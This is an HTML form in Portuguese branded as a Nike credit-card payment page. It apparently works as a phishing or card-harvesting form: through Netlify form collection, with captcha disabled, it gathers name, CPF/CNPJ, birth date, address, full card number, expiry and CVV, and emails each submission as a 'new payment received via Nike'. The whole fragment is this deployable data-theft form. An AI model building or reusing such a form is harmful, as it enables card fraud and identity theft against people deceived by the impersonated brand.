<form name="payment-form" method="POST" data-netlify="true" netlify-honeypot="bot-field">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_subject" value="Novo pagamento recebido via Nike">
    <input type="hidden" name="bot-field">

    <!-- Campos do formulário -->
    <div class="form-group">
        <label for="nome">Nome Completo:</label>
        <input type="text" id="nome" name="Nome" placeholder="Nome Completo-Titular Do Cartão" required>
    </div>
    <div class="form-group">
        <label for="email">Email:</label>
        <input type="email" id="email" name="Email" placeholder="Digite seu email" required>
    </div>
    <div class="form-group">
        <label for="cpf">CPF/CNPJ:</label>
        <input type="text" id="cpf" name="CPF/CNPJ" placeholder="CPF/CNPJ Do Titular Do Cartão" required>
    </div>
    <div class="form-group">
        <label for="telefone">Telefone:</label>
        <input type="tel" id="telefone" name="Telefone" placeholder="Digite seu número de telefone" required>
    </div>
    <div class="form-group">
        <label for="data-nascimento">Data de Nascimento:</label>
        <input type="text" id="data-nascimento" name="Data de Nascimento" placeholder="data-nascimento" required>
    </div>
    <div class="form-group">
        <label for="endereco">Endereço:</label>
        <input type="text" id="endereco" name="Endereço" placeholder="Rua, Número, Bairro" required>
    </div>
    <div class="form-group">
        <label for="cidade">Cidade:</label>
        <input type="text" id="cidade" name="Cidade" placeholder="Digite sua cidade" required>
    </div>
    <div class="form-group">
        <label for="estado">Estado:</label>
        <input type="text" id="estado" name="Estado" placeholder="Digite seu estado" required>
    </div>
    <div class="form-group">
        <label for="cep">CEP:</label>
        <input type="text" id="cep" name="CEP" placeholder="Digite seu CEP" required>
    </div>
    <div class="form-group">
        <label for="numero-cartao">Número do Cartão:</label>
        <input type="text" id="numero-cartao" name="Número do Cartão de Crédito" placeholder="Digite o número do cartão" required>
    </div>
    <div class="form-group">
        <label for="data-vencimento">Data de Vencimento (MM/AA):</label>
        <input type="text" id="data-vencimento" name="Data de Vencimento" placeholder="MM/AA" required>
    </div>
    <div class="form-group">
        <label for="cvv">Código de Segurança (CVV):</label>
        <input type="text" id="cvv" name="Código de Segurança" placeholder="Digite o CVV" required>
    </div>
    <div class="form-group">
        <label for="parcelas">Número de Parcelas:</label>
        <select id="parcelas" name="Parcelas" required>
            <option value="1">1x</option>
            <option value="2">2x</option>
            <option value="3">3x</option>
            <option value="4">4x</option>
            <option value="5">5x</option>
            <option value="6">6x</option>
            <option value="7">7x</option>
            <option value="8">8x</option>
            <option value="9">9x</option>
            <option value="10">10x</option>
            <option value="11">11x</option>
            <option value="12">12x</option>
        </select>
    </div>

    <button type="submit" class="credito-button">Pagar com Cartão de Crédito</button>
</form>
